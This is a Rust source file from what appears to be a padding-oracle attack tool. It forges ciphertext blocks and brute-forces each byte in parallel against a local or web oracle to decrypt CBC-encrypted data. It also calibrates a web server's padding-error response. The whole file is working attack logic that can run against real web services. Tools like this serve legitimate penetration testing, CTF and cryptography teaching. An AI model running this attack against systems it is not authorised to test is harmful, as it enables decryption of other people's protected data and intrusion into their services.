pub mod calibration_response;

use std::{collections::HashMap, mem};

use anyhow::{Context, Result};
use rayon::iter::{IntoParallelIterator, IntoParallelRefMutIterator, ParallelIterator};

use crate::{
    block::block_size::BlockSizeTrait,
    cypher_text::{encode::AmountBlocksTrait, forged_cypher_text::ForgedCypherText, CypherText},
    oracle::{web::calibrate_web::CalibrationWebOracle, Oracle},
    questioning::calibration_response::CalibrationResponse,
    tui::ui_update::UiUpdate,
};

/// Manages the oracle attack on a high level.
pub(super) struct Questioning<'a, U>
where
    U: FnMut(UiUpdate) + Sync + Send + Clone,
{
    forged_cypher_texts: Vec<ForgedCypherText<'a>>,
    original_cypher_text: &'a CypherText,
    update_ui_callback: U,
}

impl<'a, U> Questioning<'a, U>
where
    U: FnMut(UiUpdate) + Sync + Send + Clone,
{
    /// Divides the cypher text into a modifiable part for each block.
    pub(super) fn prepare(
        update_ui_callback: U,
        cypher_text: &'a CypherText,
        no_iv: bool,
    ) -> Result<Self> {
        let blocks_to_skip = if no_iv { 0 } else { 1 };

        let mut forged_cypher_texts =
            Vec::with_capacity(cypher_text.amount_blocks() - blocks_to_skip);
        // decryption is based on recognizing padding. Padding is only at the end of a message. So to decrypt the n-th block, all blocks after it have to be dropped and the "n - 1"-th block must be forged.
        for block_to_decrypt_idx in blocks_to_skip..cypher_text.amount_blocks() {
            forged_cypher_texts.push(ForgedCypherText::from_part_of_cypher_text(
                cypher_text,
                block_to_decrypt_idx,
            )?);
        }

        Ok(Self {
            forged_cypher_texts,
            original_cypher_text: cypher_text,
            update_ui_callback,
        })
    }

    /// Actually performs the oracle attack for each block.
    pub(super) fn start(&mut self, oracle: impl Oracle) -> Result<()> {
        let result = self.forged_cypher_texts
            .par_iter_mut().try_for_each(|forged_cypher_text| {
                let block_to_decrypt_idx = forged_cypher_text.amount_blocks() - 1;
                let block_size = *forged_cypher_text.block_size() as usize;

                let mut bytes_answered = 0;
                while bytes_answered < block_size {
                    // TODO: using `parallel-stream` instead of `rayon` would likely be better. The oracle does the hard work, i.e. decryption, and is usually remote. So we're I/O bound, which prefers async, instead of CPU bound.
                    let current_byte_solution = (u8::MIN..=u8::MAX)
                        .into_par_iter()
                        .map(|byte_value| {
                            let mut forged_cypher_text = forged_cypher_text.clone();

                            forged_cypher_text.set_current_byte(byte_value)?;
                            // TODO: add retry logic for stubborn web servers
                            let correct_padding = oracle.ask_validation(&forged_cypher_text)?;

                            (self.update_ui_callback.clone())(UiUpdate::ForgedBlockWip((forged_cypher_text.forged_block_wip().clone(), block_to_decrypt_idx)));

                            if correct_padding {
                                forged_cypher_text.lock_byte()?;
                                Ok(forged_cypher_text)
                            } else {
                                Err(anyhow::anyhow!(
                                    "Invalid padding for byte {} with block layout {:?}",
                                    block_size - bytes_answered,
                                    forged_cypher_text.forged_block_wip()
                                ))
                            }
                        })
                        .find_any(|potential_solution| potential_solution.is_ok());

                    match current_byte_solution {
                        Some(current_solution) => {
                            bytes_answered += 1;
                            mem::swap(
                                forged_cypher_text,
                                &mut current_solution.context(format!("Failed to decrypt block {}", block_to_decrypt_idx + 1))?
                            );

                            (self.update_ui_callback.clone())(UiUpdate::ProgressUpdate);
                        }
                        // TODO: auto-retry or ask user. Also, don't crash but return whatever we already had
                        None => unreachable!("A solution for the current byte should exist at this point. We tried all possible byte values")
                    }
                }

                (self.update_ui_callback.clone())(UiUpdate::ForgedBlock((forged_cypher_text.forged_block_solution().clone(), block_to_decrypt_idx)));

                Ok(())
            });

        (self.update_ui_callback)(UiUpdate::SlowRedraw);

        result
    }

    /// Find how the web oracle responds in case of a padding error
    pub(super) fn calibrate_web_oracle(
        &mut self,
        oracle: CalibrationWebOracle,
    ) -> Result<CalibrationResponse> {
        // `clone` to make sure we don't modify any forged cypher texts before the actual attack
        let calibration_cypher_text = &self.forged_cypher_texts[0];

        let responses = (u8::MIN..=u8::MAX)
            .into_par_iter()
            .map(|byte_value| {
                let mut forged_cypher_text = calibration_cypher_text.clone();

                forged_cypher_text.set_current_byte(byte_value)?;
                // TODO: add retry logic for stubborn web servers
                let response = oracle.ask_validation(&forged_cypher_text)?;
                CalibrationResponse::from_response(response, *oracle.config().consider_body())
            })
            .collect::<Result<Vec<_>>>()
            .context("Failed to request web server for calibration")?;

        // false positive, the hashmap's key (`response`) is obviously not mutable
        #[allow(clippy::mutable_key_type)]
        let counted_responses = responses.into_iter().fold(
            HashMap::new(),
            |mut acc: HashMap<CalibrationResponse, usize>, response| {
                *acc.entry(response).or_default() += 1;
                acc
            },
        );

        let padding_error_response = counted_responses
            .into_iter()
            .max_by_key(|(_, seen)| *seen)
            .map(|(response, _)| response)
            .expect("The hashmap didn't contain any responses for calibration");

        Ok(padding_error_response)
    }
}
